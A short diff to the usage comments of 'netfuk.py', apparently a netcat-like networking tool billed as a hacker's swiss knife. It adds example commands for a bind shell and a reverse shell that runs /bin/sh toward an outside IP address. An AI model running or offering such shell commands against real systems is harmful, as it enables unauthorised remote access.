@@ -3,10 +3,12 @@
 # The swiss knife of hackers
 #
 # Usage examples: 
-# python netfuk.py -l 0.0.0.0 4040
+# python netfuk.py -l 4040
 # python netfuk.py -l 0.0.0.0 4040 -c id
-# python netfuk.py -l 0.0.0.0 4040 -e /bin/sh
+# python netfuk.py -l 127.0.0.1 4040 -e /bin/sh # bind shell
 # python netfuk.py 11.22.33.44 6675
+# python netfuk.py 11.22.33.44 6675 -e /bin/sh # reverse shell
+# echo -ne "Supports stdin" | python netfuk.py 11.22.33.44 4455
 
 
 import sys
